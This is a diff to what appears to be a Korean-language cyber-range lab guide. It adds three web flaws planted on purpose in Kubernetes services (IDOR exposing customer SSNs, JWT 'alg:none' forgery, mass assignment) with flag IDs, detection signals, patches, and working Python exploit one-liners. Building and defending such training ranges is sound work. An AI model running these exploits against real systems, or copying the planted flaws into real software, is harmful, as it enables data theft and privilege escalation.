@@ -73,6 +73,62 @@ kubectl -n internal rollout restart deploy/admin-dashboard
 # 보상통제(병행): A2 는 catalog-api egress NP 로도 내부 피벗 차단. A3 탈출은 Falco 탐지 + PSA.
 ```
 
+## Tier B — 웹 계층 확장 (대체 경로)
+
+| # | 취약점 | 엔드포인트 (심은 위치) | 효과·브릿지 | flag_id | MITRE | god-view 신호 | 방어 |
+|---|--------|------------------------|-------------|---------|-------|---------------|------|
+| B1 | BOLA / IDOR | `order-api GET /api/invoice/<oid>` | 인증 없이 oid 열거 → 타 고객 PII(ssn) 대량 수집 | `web-bola` | T1190/T1213 | `/api/invoice/` 접근(정상 호출자 없음) | patch_app(인증 요구+PII 최소화) |
+| B2 | 인증 우회 (JWT) | `auth-service GET /api/me` | `alg:none` 위조 JWT 수용 → role=admin 사칭 | `web-authn` | T1078 | app 로그 `authn=none_alg` | patch_app(redis 세션만 수용) |
+| B3 | Mass Assignment | `order-api POST /api/account/update` | role/tier 자기상향(권한상승) | `web-massassign` | T1190 | app 로그 `fields`에 role/tier | patch_app(필드 allowlist) |
+
+### 수동 walkthrough (발판에서, python)
+
+**B1 — BOLA 로 영수증 열거해 PII 수집:**
+```bash
+kubectl -n backend exec deploy/catalog-api -- python -c '
+import urllib.request
+for oid in range(1, 6):
+    try: print(urllib.request.urlopen("http://order-api.backend.svc.cluster.local:8080/api/invoice/%d"%oid).read().decode())
+    except Exception as e: print(oid, e)
+'
+# → 각 주문의 customer·email·phone·ssn 가 인증 없이 노출
+```
+
+**B2 — alg:none 위조 JWT 로 admin 사칭:**
+```bash
+kubectl -n backend exec deploy/catalog-api -- python -c '
+import base64, json, urllib.request
+def b64(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b"=").decode()
+tok = b64({"alg":"none","typ":"JWT"})+"."+b64({"user":"attacker","role":"admin"})+"."   # 서명 없음
+req = urllib.request.Request("http://auth-service.backend.svc.cluster.local:8080/api/me",
+      headers={"Authorization":"Bearer "+tok})
+print(urllib.request.urlopen(req).read().decode())
+# → {"session": {"user":"attacker","role":"admin"}, "note":"legacy-token"}  (위조 수용)
+'
+```
+
+**B3 — mass-assignment 으로 자기 등급·권한 상향:**
+```bash
+kubectl -n backend exec deploy/catalog-api -- python -c '
+import json, urllib.request
+body = json.dumps({"id": 2, "tier": "vip", "role": "admin"}).encode()
+req = urllib.request.Request("http://order-api.backend.svc.cluster.local:8080/api/account/update",
+      data=body, headers={"Content-Type":"application/json"})
+print(urllib.request.urlopen(req).read().decode())
+# → {"updated": {"id":2,"name":...,"tier":"vip","role":"admin"}}  (권한 필드 상향됨)
+'
+```
+
+### 방어 검증 (patch_app)
+```bash
+kubectl apply -f k8s/killchain/defense-reference/app-hardened/order-api-code.yaml
+kubectl -n backend rollout restart deploy/order-api
+#   → B1: /api/invoice 401(인증요구)·PII 미반환 · B3: role/tier 무시(allowlist)
+kubectl apply -f k8s/killchain/defense-reference/app-hardened/auth-service-code.yaml
+kubectl -n backend rollout restart deploy/auth-service
+#   → B2: 위조 JWT 401(redis 세션만 수용)
+```
+
 ## god-view 채점 (AppLogSource — 배선 완료)
 
 - **달성(achievement)**: 경로 불문 — 공격자가 보고한 FLAG 문자열을 `registry.match_value` 가 ④와
